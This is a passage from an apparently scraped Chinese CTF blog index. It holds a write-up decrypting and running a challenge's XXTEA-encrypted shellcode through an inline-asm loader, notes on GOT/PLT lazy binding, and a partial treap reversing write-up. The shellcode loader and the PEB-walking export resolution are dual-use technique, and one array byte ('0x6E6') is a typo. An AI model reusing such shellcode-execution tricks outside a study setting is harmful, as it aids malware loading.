2329017756590022981 ll 85: 7b 1a c8 ff 00 00 00 00 *(u64 *)(r10 - 56) = r1 86: 18 01 00 00 57 45 4c 4c 00 00 00 00 20 44 4f 4e r1 = 5642803763628229975 ll 88: 7b 1a c0 ff 00 00 00 00 *(u64 *)(r10 - 64) = r1 89: b7 06 00 00 00 00 00 00 r6 = 0 90: 73 6a e0 ff 00 00 00 00 *(u8 *)(r10 - 32) = r6 91: bf a1 00 00 00 00 00 00 r1 = r10 92: 07 01 00 00 c0 ff ff ff r1 += -64 93: bf a3 00 00 00 00 00 00 r3 = r10 94: 07 03 00 00 e8 ff ff ff r3 += -24 95: b7 02 00 00 21 00 00 00 r2 = 33 96: 85 00 00 00 06 00 00 00 call 6LBB0_5: 97: bf 60 00 00 00 00 00 00 r0 = r6 98: 95 00 00 00 00 00 00 00 exit 123456789101112131415161718192021222324252627from z3 import *from Crypto.Util.number import *r2 = Int(&#x27;r2&#x27;) # flag[2]r3 = Int(&#x27;r3&#x27;) # flag[3]r4 = Int(&#x27;r4&#x27;) # flag[1]r1 = Int(&#x27;r1&#x27;) # flag[0]s = Solver()s.add(r3 * 28096 + r2 * 64392 + r4 * 29179 + r1 * 52366 == 209012997183893)s.add(r3 * 61887 + r2 * 27365 + r4 * 44499 + r1 * 37508 == 181792633258816)s.add(r3 * 56709 + r2 * 32808 + r4 * 25901 + r1 * 59154 == 183564558159267)s.add(r3 * 33324 + r2 * 51779 + r4 * 31886 + r1 * 62010 == 204080879923831)assert s.check() == satflag = b&quot;&quot;m = s.model()# for i in [r1, r4, r2, r3]:# flag += long_to_bytes(m[i].as_long())[::-1]for i in [r3, r2, r4, r1]: flag += long_to_bytes(m[i].as_long())[::-1]print(flag)# 0vR3sAlbs8pD2h53 the_shellcode执行程序，dump下来，IDA打开dump文件分析，配合OD动态调试程序，发现↓程序逻辑为先输入base64加密的shellcode（len=352），然后shellcode解密，每一个字节执行rol 3操作，再魔改的xxtea解密，然后再输入flag（len=14）,再根据shellcode验证flag xxtea密文是 byte_1A3310[264] 12345678910111213141516171819202122232425262728293031unsigned char ida_chars[] =&#123; 0xA1, 0x89, 0x6B, 0x4B, 0x53, 0x54, 0xC1, 0x74, 0x6E, 0xA0, 0x92, 0x40, 0x07, 0x0C, 0x9B, 0x42, 0x84, 0x1E, 0x28, 0x40, 0xC9, 0x44, 0x5B, 0x8B, 0x7B, 0xB3, 0xFE, 0x66, 0x03, 0xA6, 0x77, 0x3C, 0x2D, 0x89, 0xC5, 0x79, 0x97, 0xDA, 0x7A, 0x0D, 0x56, 0xAA, 0x51, 0x1D, 0x03, 0xD7, 0xD4, 0x02, 0xBA, 0x26, 0xA5, 0x4F, 0x4A, 0xD6, 0xFA, 0x32, 0x91, 0x60, 0x0F, 0x0C, 0x93, 0x75, 0x2B, 0x56, 0x67, 0xDD, 0x9A, 0xDB, 0x63, 0x55, 0x16, 0x76, 0x15, 0x93, 0xF7, 0xA5, 0x1D, 0x99, 0xEB, 0x3A, 0xD4, 0x21, 0xB7, 0x1A, 0x2C, 0x9D, 0xCD, 0xAA, 0x27, 0x2B, 0x5C, 0x82, 0x1A, 0x76, 0xA7, 0x76, 0x18, 0x5F, 0x00, 0xB4, 0x63, 0x37, 0x7F, 0x11, 0x40, 0xC5, 0x2C, 0x51, 0x6F, 0xA1, 0x94, 0xC5, 0x8C, 0x4F, 0xE2, 0xD0, 0xE9, 0xE2, 0xA3, 0x9C, 0xD5, 0xC2, 0x9C, 0x0A, 0x1D, 0xE6, 0x29, 0x46, 0xE3, 0x29, 0x71, 0x63, 0xD7, 0x8A, 0x4E, 0xCA, 0x71, 0xAF, 0xDF, 0xF5, 0xAB, 0x68, 0x4E, 0x47, 0x3A, 0xBC, 0x2F, 0x54, 0x17, 0x16, 0x74, 0xD6, 0xE5, 0xBB, 0x0D, 0xAD, 0xE3, 0xBB, 0xF7, 0x62, 0x07, 0x8C, 0xD6, 0xC8, 0x0E, 0x95, 0x0E, 0x88, 0xBA, 0x25, 0x0F, 0xF8, 0x4C, 0x26, 0x7A, 0x76, 0x14, 0xE0, 0x7C, 0x9A, 0xEE, 0xC9, 0x8B, 0x5C, 0xD4, 0xF7, 0x9E, 0x5D, 0xDE, 0xAC, 0x99, 0xB9, 0x13, 0x8E, 0xEC, 0xB2, 0x2D, 0x23, 0x68, 0xEE, 0xCE, 0x5F, 0x7C, 0x92, 0x5D, 0xA8, 0xE3, 0xC9, 0x6B, 0xB5, 0x74, 0xAC, 0x12, 0xE7, 0xB6, 0x42, 0xDA, 0x98, 0x28, 0xCD, 0x58, 0x1C, 0xF1, 0xFC, 0xEE, 0x75, 0x70, 0xF5, 0x78, 0xE6, 0x76, 0x50, 0x35, 0x6A, 0xD6, 0xD4, 0xB9, 0x5A, 0x10, 0x95, 0x03, 0x44, 0xB0, 0x1B, 0x59, 0xB9, 0x40, 0xB2, 0x1A, 0x26, 0x4E, 0x7B, 0xD8, 0x29, 0xD1, 0x23, 0xCD, 0x52, 0xE7, 0xF5, 0x70, 0x8F, 0xA7, 0x4E&#125;; 魔改为 #define MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) 解密shellcode的脚本为 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x61C88647 #define MX (((z&gt;&gt;6^ (y * 4)) + (y&gt;&gt;3^ (z*16))) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t* v, int n, uint32_t const key[4])&#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum -= DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) /* Decoding Part */ &#123; n = -n; rounds = 6 + 52 / n; sum = 0 - rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum += DELTA; &#125; while (--rounds); &#125;&#125;unsigned char enc_shellcode[] =&#123; 0xA1, 0x89, 0x6B, 0x4B, 0x53, 0x54, 0xC1, 0x74, 0x6E6, 0xA0, 0x92, 0x40, 0x07, 0x0C, 0x9B, 0x42, 0x84, 0x1E, 0x28, 0x40, 0xC9, 0x44, 0x5B, 0x8B, 0x7B, 0xB3, 0xFE, 0x66, 0x03, 0xA6, 0x77, 0x3C, 0x2D, 0x89, 0xC5, 0x79, 0x97, 0xDA, 0x7A, 0x0D, 0x56, 0xAA, 0x51, 0x1D, 0x03, 0xD7, 0xD4, 0x02, 0xBA, 0x26, 0xA5, 0x4F, 0x4A, 0xD6, 0xFA, 0x32, 0x91, 0x60, 0x0F, 0x0C, 0x93, 0x75, 0x2B, 0x56, 0x67, 0xDD, 0x9A, 0xDB, 0x63, 0x55, 0x16, 0x76, 0x15, 0x93, 0xF7, 0xA5, 0x1D, 0x99, 0xEB, 0x3A, 0xD4, 0x21, 0xB7, 0x1A, 0x2C, 0x9D, 0xCD, 0xAA, 0x27, 0x2B, 0x5C, 0x82, 0x1A, 0x76, 0xA7, 0x76, 0x18, 0x5F, 0x00, 0xB4, 0x63, 0x37, 0x7F, 0x11, 0x40, 0xC5, 0x2C, 0x51, 0x6F, 0xA1, 0x94, 0xC5, 0x8C, 0x4F, 0xE2, 0xD0, 0xE9, 0xE2, 0xA3, 0x9C, 0xD5, 0xC2, 0x9C, 0x0A, 0x1D, 0xE6, 0x29, 0x46, 0xE3, 0x29, 0x71, 0x63, 0xD7, 0x8A, 0x4E, 0xCA, 0x71, 0xAF, 0xDF, 0xF5, 0xAB, 0x68, 0x4E, 0x47, 0x3A, 0xBC, 0x2F, 0x54, 0x17, 0x16, 0x74, 0xD6, 0xE5, 0xBB, 0x0D, 0xAD, 0xE3, 0xBB, 0xF7, 0x62, 0x07, 0x8C, 0xD6, 0xC8, 0x0E, 0x95, 0x0E, 0x88, 0xBA, 0x25, 0x0F, 0xF8, 0x4C, 0x26, 0x7A, 0x76, 0x14, 0xE0, 0x7C, 0x9A, 0xEE, 0xC9, 0x8B, 0x5C, 0xD4, 0xF7, 0x9E, 0x5D, 0xDE, 0xAC, 0x99, 0xB9, 0x13, 0x8E, 0xEC, 0xB2, 0x2D, 0x23, 0x68, 0xEE, 0xCE, 0x5F, 0x7C, 0x92, 0x5D, 0xA8, 0xE3, 0xC9, 0x6B, 0xB5, 0x74, 0xAC, 0x12, 0xE7, 0xB6, 0x42, 0xDA, 0x98, 0x28, 0xCD, 0x58, 0x1C, 0xF1, 0xFC, 0xEE, 0x75, 0x70, 0xF5, 0x78, 0xE6, 0x76, 0x50, 0x35, 0x6A, 0xD6, 0xD4, 0xB9, 0x5A, 0x10, 0x95, 0x03, 0x44, 0xB0, 0x1B, 0x59, 0xB9, 0x40, 0xB2, 0x1A, 0x26, 0x4E, 0x7B, 0xD8, 0x29, 0xD1, 0x23, 0xCD, 0x52, 0xE7, 0xF5, 0x70, 0x8F, 0xA7, 0x4E&#125;;int main()&#123; uint32_t* v = (uint32_t *)enc_shellcode; uint32_t const k[4] = &#123;116, 111, 114, 97 &#125;; btea(v, -66, k); for (int i = 0; i &lt; 264; i++) &#123; enc_shellcode[i] = ((enc_shellcode[i] &gt;&gt; 3) &amp; 0XFF) | ((enc_shellcode[i] &lt;&lt; 5) &amp; 0XFF); &#125; for (int i = 0; i &lt; 264; i++) &#123; printf(&quot;\\\\x%02x&quot;, enc_shellcode[i]); &#125; return 0;&#125; base64加密后是:YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL//// 写程序，直接F5看shellcode 123456789101112#include &lt;stdio.h&gt; char shellcode[] = &#123; 0x60, 0xfc, 0x68, 0x4c, 0x77, 0x26, 0x7, 0x33, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0xf, 0xb7, 0x4a, 0x26, 0x33, 0xff, 0x33, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x3, 0xc2, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0xf, 0x84, 0xbe, 00, 00, 00, 0x3, 0xc2, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x3, 0xda, 0x83, 0xf9, 00, 0xf, 0x84, 0xa9, 00, 00, 00, 0x49, 0x8b, 0x34, 0x8b, 0x3, 0xf2, 0x33, 0xff, 0x33, 0xc0, 0xac, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x3a, 0xc4, 0x75, 0xf4, 0x3, 0x7c, 0x24, 0x4, 0x3b, 0x7c, 0x24, 0xc, 0x75, 0xd9, 0x33, 0xff, 0x33, 0xc9, 0x83, 0xc2, 0x50, 0xf, 0xb6, 0x4, 0xa, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x41, 0x83, 0xf9, 0xe, 0x75, 0xf1, 0xc1, 0xcf, 0xd, 0x57, 0x33, 0xff, 0x33, 0xc9, 0x8b, 0x54, 0x24, 0x3c, 0x52, 0xf, 0xb6, 0x1c, 0xe, 0xb8, 0x67, 0x66, 0x66, 0x66, 0xf7, 0xeb, 0xd1, 0xfa, 0x8b, 0xc2, 0xc1, 0xe8, 0x1f, 0x3, 0xc2, 0x8d, 0x4, 0x80, 0x2b, 0xd8, 0x5a, 0xf, 0xb6, 0x4, 0xa, 0x2b, 0xc3, 0xc1, 0xcf, 0xd, 0x3, 0xf8, 0x41, 0x83, 0xf9, 0xe, 0x75, 0xd4, 0xc1, 0xcf, 0xd, 0x3b, 0x3c, 0x24, 0x74, 0x16, 0x68, 0x25, 0x73, 00, 00, 0x8b, 0xc4, 0x68, 0x6e, 0x6f, 00, 00, 0x54, 0x50, 0x8b, 0x5c, 0x24, 0x48, 0xff, 0xd3, 0xeb, 0x14, 0x68, 0x25, 0x73, 00, 00, 0x8b, 0xc4, 0x68, 0x79, 0x65, 0x73, 00, 0x54, 0x50, 0x8b, 0x5c, 0x24, 0x48, 0xff, 0xd3, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x61, 0xc3, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xe9, 0xb, 0xff, 0xff, 0xff &#125;;int main()&#123; __asm &#123; lea eax, shellcode; push eax; ret &#125; return 0;&#125; 配合OD动调分析如下图 写脚本解密即可 123456789key = [1, 1, 2, 0, 1, 0, 3, 4, 2, 4, 1, 4, 0, 0]flag_fake = b&quot;is program can&quot;flag = [flag_fake[i] + key[i] for i in range(14)]print(bytes(flag))# b&#x27;jt&quot;psojvcq!gan&#x27;a = b&quot;YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL////&quot; + b&#x27;jt&quot;psojvcq!gan&#x27;print(&quot;HFCTF&#123;&quot; + md5(a).hexdigest() + &quot;&#125;&quot;)# HFCTF&#123;2b794e95022f2fe46106c21bbf57a755&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"https://zzzzsky.github.io/tags/shellcode/"}]},{"title":"第2章_二进制文件","slug":"第2章_二进制文件","date":"2022-03-16T06:20:00.000Z","updated":"2022-03-22T12:26:02.352Z","comments":true,"path":"2022/03/16/第2章_二进制文件/","link":"","permalink":"https://zzzzsky.github.io/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/","excerpt":"","text":"看到静态链接和动态链接这里，静态链接和windows上感觉一样，就不写了，感觉这里有个位置无关代码和延迟绑定挺有意思，记录一下 位置无关代码​ 在windows平台上，对于DLL文件的全局变量，在DLL加载到内存中后，要是没有加载到对应的位置，需要重定位，这个时候就需要重定位表, 而这里提到了一个位置无关代码的概念，可以加载而无需重定位的代码称为位置无关代码（Position-Independent Code, PIC），通过GCC传递 -fpic 参数就可以生成PIC。 1个ELF文件本身，数据段和代码段的相对距离是不变的，因此指令和变量之间的举例就是一个运行时常量，与绝对地址无关，这就是PIC的核心。 全局偏移量表GOT（Global Offset Table）被拆分为.got节和.got.plt节，可以理解为是个数组，单位是8字节 .got 不需要延迟绑定，用于保存全局变量引用，加载到内存标记为只读 .got.plt 需要延迟绑定，保存函数引用，具有读写权限 写代码测试下 (比书上多加了一个func2，为了测试延迟绑定调用那个_dl_runtime_resolve前的push ,是不是push的func的索引) 123456789101112131415161718192021222324//main.cextern int shared;extern void func(int *a, int *b);extern void func2(int *a, int *b);int main()&#123; int a= 100; func(&amp;a, &amp;shared); func2(&amp;a, &amp;shared); return 0;&#125;//func.cint shared = 1;int tmp = 0;void func(int * a, int *b)&#123; tmp = *a; *a = *b; *b = tmp;&#125;void func2(int * a, int *b)&#123; *a = *b;&#125; 12gcc -shared -fpic -o func.so func.cgcc -fno-stack-protector -fno-pie -no-pie -o func.ELF2 main.c ./func.so # 这里与书上不一样，查到-fno-pie -no-pie 去除地址随机化，要不影响实验 12345678910111213╭─ ~/Desktop/testC/dyn ✔ ╰─ objdump -d -M intel --section=.text func.so | grep -A 10 &quot;&lt;func&gt;&quot;00000000000005ea &lt;func&gt;: 5ea: 55 push rbp 5eb: 48 89 e5 mov rbp,rsp 5ee: 48 89 7d f8 mov QWORD PTR [rbp-0x8],rdi 5f2: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 5f6: 48 8b 45 f8 mov rax,QWORD PTR [rbp-0x8] 5fa: 8b 10 mov edx,DWORD PTR [rax] 5fc: 48 8b 05 d5 09 20 00 mov rax,QWORD PTR [rip+0x2009d5] # 200fd8 &lt;tmp-0x50&gt; 603: 89 10 mov DWORD PTR [rax],edx 605: 48 8b 45 f0 mov rax,QWORD PTR [rbp-0x10] 609: 8b 10 mov edx,DWORD PTR [rax] 因为这个地方写的是RIP +0x2009d5， 是一个偏移，而不是一个写死的地址，所以是PIC, 因为RIP其实就是基址+ 固定的偏移，所以不管基址怎么变化，这个地方的RIP + 0X2009E5指向的总是tmp变量， 如下如，这里是IDA动态调试起来的样子。 延迟绑定​ 对于调用的别的so中的函数，只有当这个函数真正调用的时候，才往对应地址处写入这个函数的地址，因为如果导入的函数比较多，都在一开始加载地址的话，会影响性能。 ELF文件通过过程链接表（Procedure Linkage Table, PLT）和GOT表配合来实现延迟绑定。，PLT也是个数组，单位是16字节，PLT[0]是用于跳转到动态链接器，IDA远程动态调试观, 在call func处下断点，观察PLT(指的是.plt节处的数据) 和 GOT(这里指的是.got.plt节处的数据)，整理下来 1234567891011121314151617181920212223# 下断点位置.text:0000000000400652 E8 E9 FE FF FF call sub_400540 ; func函数# PLT[0] .plt:0000000000400520 push cs:qword_601008.plt:0000000000400526 jmp cs:qword_601010# PLT[1].plt:0000000000400530 jmp cs:off_601018.plt:0000000000400536 push 0.plt:000000000040053B jmp sub_400520# PLT[2].plt:0000000000400540 jmp cs:off_601020.plt:0000000000400546 push 1.plt:000000000040054B jmp sub_400520# GOT[0].got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC# GOT[1].got.plt:0000000000601008 qword_601008 dq 7F53FD96D170h ; DATA XREF: sub_400520↑r ;reloc entries# GOT[2].got.plt:0000000000601010 qword_601010 dq 7F53FD7598F0h ; DATA XREF: sub_400520+6↑r ; _dl_runtime_resolve# GOT[3].got.plt:0000000000601018 off_601018 dq offset sub_400536 ; DATA XREF: .plt:loc_400530↑r ; func2# GOT[4].got.plt:0000000000601020 off_601020 dq offset sub_400546 ; DATA XREF: .plt:loc_400540↑r ; func 然后再在call func2那里下断点，再次观察PLT表和GOT表 12345.text:0000000000400663 E8 C8 FE FF FF call loc_400530 ; func2函数# GOT[3].got.plt:0000000000601018 off_601018 dq offset sub_400536 ; DATA XREF: .plt:loc_400530↑r ; func2# GOT[4]got.plt:0000000000601020 off_601020 dq offset func ; DATA XREF: .plt:loc_400540↑r ; func 可以发现GOT[4]这里已经填入了真正的函数地址，因为前面在调用func的时候,压入了1，而func在GOT表中，在函数的索引这里确实是1（除去其他固定的DYNAMIC， reloc entries， 和dl_runtime_resolve） 12.plt:0000000000400546 push 1.plt:000000000040054B jmp sub_400520 在调用func2的时候是push 0 ，我们这里把0改为1，patch下，测试下我们的猜想 执行，可以发现确实是调用了func函数 再观察下GOT表，看看有没有变化 显然，GOT表没有变化，所以猜测成功。 这里用EXCLE表格来表示下整体的流程","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"2022_SUSCTF_tttree题解","slug":"2022_SUSCTF部分RE_WP","date":"2022-03-03T02:55:00.000Z","updated":"2022-03-03T03:03:51.453Z","comments":true,"path":"2022/03/03/2022_SUSCTF部分RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/","excerpt":"","text":"2022_SUSCTF_tttree题解这道题比赛时，逆出了整个节点结构体，就是最后通过二叉树找到索引的时候不会了，只爆破出来了flag的4位，后来看了看别人的WP才发现程序中是存着节点之间的关系的（可惜啊，当时调试还是没有足够的耐心啊，这里复现下， 首先将程序去除ASLR, 用CFF Explorer打开程序，去除去除DLL Can move的属性，然后保存，这样每次程序加载的基址就不会变，就可以方便的下断点了 输入flag，按下暂停键， 然后回车，程序断下，直接ALT+F9 运行到用户代码 观察堆栈，可以发现在00014000E1B0的位置处存着输入的flag，直接转过去，下硬件断点，然后执行 发现程序是从1开始验证的，正好略过了前面的SUSCTF，也就是说他会检测SUSCTF{xxx } 里的 xxx，这里就会发现程序用了花指令，每一段里面存放着1条真正的指令 一路F7，观察执行的汇编，整理 1234567891011121314RAX是自己输入的字符 # 0x31RDX # 0X60 每一次都是固定的RCX # mov ecx, dword ptr ss:[rsp+0x30] 也是每次固定的数据 0XC1RCX = (RDX + 97) # RCX的数据恰好是RDX + 97 RCX = RAX + RCX # RCX = 0XC1 + 0X31 == 0XF2RAX = RCX # RAX = 0XF2EAX + i(index) # EAX = EAX + 0(第一次是0) EAX = (0XF2 + 0) EAX = 0XF2RCX = imov dword ptr ss:[rsp+rcx*4+0x40], eax # 把算好的EAX放到了某个固定的位置 放在了栈中，是个局部变量.... 000000014001C2D6 | 48:83F8 28 | cmp rax,0x28 # 通过这里可以看出flag的长度是40位，除去SUSCTF&#123;&#125; ，中间的是32位..... 将EDX里面的值提取出来， 12key = [0x60, 0x46, 0x62, 0x03, 0x16, 0x19, 0x1E, 0x12, 0x4D, 0x51, 0x05, 0x25, 0x38, 0x2F, 0x14, 0x4F, 0x5B, 0x2D, 0x4C, 0x26, 0x5A, 0x0F, 0x04, 0x07, 0x5F, 0x1D, 0x48, 0x1F, 0x67, 0x44, 0x3B, 0x37] 可以发现，只要把加密后的enc_flag执行 flag = [enc_flag[i] - key[i] - 97 - i for i in range(32)] 就可以得到flag了 继续F7运行, 提取出有效的汇编指令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143# 验证完长度是40后# 初始位置XXXXmov dword ptr ss:[rsp+0x24], 0x0 cmp dword ptr ss:[rsp+0x24], 0x20 # i &lt; 32? # 地址是00000001400158B8 movsxd rax, dword ptr ss:[rsp+0x24]mov edx, dword ptr ss:[rsp+rax*4+0x40] # 取加密后的inputlea rcx, ds:[0x00000001400073B0] mov dword ptr ss:[rsp+0x10], edx mov qword ptr ss:[rsp+0x8], rcx # 00000001400073B0sub rsp, 0x28mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxcmp dword ptr ds:[rax], 0x0 # 地址是：0000000140002A7Dje 0x00000001400122FE # 第一次是跳#****************************************************这是跳的情况****************************************************mov eax, dword ptr ds:[0x00000001400073B8] # 初始值是0inc eaxmov dword ptr ds:[0x00000001400073B8], eax # [0x00000001400073B8]++ mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给rax mov ecx, dword ptr ds:[0x00000001400073B8] mov dword ptr ds:[rax], ecx # 就是把[0x00000001400073B8] --&gt; [0x00000001400073B0] mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给 raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0]mov dword ptr ds:[rcx+rax*1+0x14], 0x1 mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov dword ptr ds:[rcx+rax*1+0xC], 0x1mov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给raxmovsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0] mov edx,dword ptr ss:[rsp+0x38] # 地址时: 0000000140016535 | 8B5424 38 取出EDX，即前面的加密后的inputmov dword ptr ds:[rcx+rax*1+0x8], edxmov rax, qword ptr ss:[rsp+0x30] # 取出 00000001400073B0 给 RAXmov eax, dword ptr ds:[rax]add eax, 0x6lea rcx, ds:[0x000000014000E1B0] # 0x000000014000E1B0 是输入的原始flag的全局位置movsx eax, byte ptr ds:[rcx+rax*1] # 取出 0x31 (&#x27;1&#x27;) 这是自己输入的mov rcx, qword ptr ss:[rsp+0x30] # 00000001400073B0 给 rcxmovsxd rcx, dword ptr ds:[rcx]imul rcx, rcx, 0x1Clea rdx, ds:[0x00000001400073C0]mov dword ptr ds:[rdx+rcx*1+0x18], eax # 把加密后的那个Input放到那个内存位置，像是一个结构体 ##### 暂时不知道这一段是啥意思 (乘 0xbc8f) % 0x7FFFFFFF 谷歌搜到 # https://rvklein.me/proj/rando/rando-code.htmlmovsxd rax, dword ptr ds:[0x00000001400062C0] # 0x00000001400062C0的初始值是 0x1DF2ED66 # 本条指令地址是000000014001ABCC imul rax, rax, 0xBC8F #0000185591BAFD68mov ecx, 0x7FFFFFFF idiv rcx # 第二轮 RAX: 00000000000030AB RDX 0000000011BB2E13(余数) 这里是生成优先级，使其二叉搜索树满足堆的性质mov rax, rdx mov dword ptr ds:[0x00000001400062C0], eax mov eax, dword ptr ds:[0x00000001400062C0]#####movsxd rcx, dword ptr ds:[0x00000001400073B4]lea rdx, ds:[0x0000000140007220]mov dword ptr ds:[rdx+rcx*4], eax # 000000002109B018movsxd rax, dword ptr ds:[0x00000001400073B4]lea rcx, ds:[0x0000000140007220]mov rdx, qword ptr ss:[rsp+0x30] # 00000001400073B0 给 rdx movsxd rdx, dword ptr ds:[rdx]imul rdx, rdx, 0x1Clea r8, ds:[0x00000001400073C0]mov eax, dword ptr ds:[rcx+rax*4] mov dword ptr ds:[r8+rdx*1+0x10], eax # 000000002109B018mov eax, dword ptr ds:[0x00000001400073B4]inc eaxmov dword ptr ds:[0x00000001400073B4], eaxadd rsp, 0x28mov eax, dword ptr ss:[rsp+0x24] # 一轮循环结束inc eax mov dword ptr ss:[rsp+0x24], eax cmp dword ptr ss:[rsp+0x24], 0x20 # 回到了最上面的初始位置XXXX 地址：00000001400158B8#****************************************************这是不跳的情况****************************************************mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0 # 地址是0000000140012B60movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0] mov eax, dword ptr ds:[rcx+rax*1+0xC]inc eaxmov rcx, qword ptr ss:[rsp+0x30]movsxd rcx, dword ptr ds:[rcx] # 00000001400073B0imul rcx, rcx, 0x1Clea rdx, ds:[0x00000001400073C0]mov dword ptr ds:[rdx+rcx*1+0xC], eax # 变为了2mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0movsxd rax, dword ptr ds:[rax] imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov edx, dword ptr ss:[rsp+0x38] # 取出enc_input cmp dword ptr ds:[rcx+rax*1+0x8], edxje 0x0000000140011E04 mov rax, qword ptr ss:[rsp+0x30]movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1Clea rcx, ds:[0x00000001400073C0]mov eax, dword ptr ds:[rcx+rax*1+0x8] # 取出enc_inputcmp dword ptr ss:[rsp+0x38], eaxjg 0x0000000140017AF8mov rax, qword ptr ss:[rsp+0x30] # 00000001400073B0movsxd rax, dword ptr ds:[rax]imul rax, rax, 0x1C lea rcx, ds:[0x00000001400073C0]add rcx, raxmov rax, rcxmov edx, dword ptr ss:[rsp+0x38]mov rcx, raxmov dword ptr ss:[rsp+0x10], edxmov qword ptr ss:[rsp+0x8], rcx sub rsp, 0x28mov rax, qword ptr ss:[rsp+0x30] #00000001400073DCcmp dword ptr ds:[rax], 0x0je ****mov eax, dword ptr ds:[0x00000001400073B8]inc eax mov dword ptr ds:[0x00000001400073B8], eax 经过无尽的调试（在判断插入节点个数那里下断点，每插入一个节点，就把0x00000001400073B0那里的数据提取出来，进行比对）就会发现，程序是把输入的flag按照Treap的特性存放在了00000001400073C0处，这里是一个长度为33的结构体数组，(第一个数组全是0，因为序号是从1开始的，序号是0表示为空，有效的就是后面32个数组)每个单元的大小是0X1C 123456789struct tree_node&#123; 0x00 DWORD 左孩子; //0表示空 0x04 DWORD 右孩子; 0X08 DWORD enc_input; //加密后的每一个字符 0X0C DWORD 叶子个数; 